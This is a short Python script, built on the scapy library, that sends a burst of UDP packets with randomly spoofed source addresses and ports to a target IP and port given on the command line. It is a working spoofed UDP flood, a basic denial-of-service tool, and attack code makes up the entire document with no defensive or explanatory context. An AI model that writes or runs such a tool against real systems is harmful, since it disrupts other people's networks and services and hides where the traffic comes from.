#!/usr/bin/env python3

from scapy.all import IP, UDP, Raw, send
from ipaddress import IPv4Address
from random import getrandbits
import sys
import time

if len(sys.argv) < 3:
    print(f"Usage: python3 {sys.argv[0]} <TARGET_IP> <TARGET_PORT>")
    sys.exit(1)

TARGET_IP = sys.argv[1]
TARGET_PORT = int(sys.argv[2])

if not 1 <= TARGET_PORT <= 65535:
    print("Invalid port")
    sys.exit(1)

PACKET_COUNT = 1000
INTERVAL = 0.001

for _ in range(PACKET_COUNT):
    packet = (
        IP(
            src=str(IPv4Address(getrandbits(32))),
            dst=TARGET_IP
        )
        / UDP(
            sport=getrandbits(16),
            dport=TARGET_PORT
        )
        / Raw(load=b"A" * 64)
    )

    send(packet, verbose=False)
    time.sleep(INTERVAL)

print(f"Sent {PACKET_COUNT} spoofed UDP packets to {TARGET_IP}:{TARGET_PORT}")
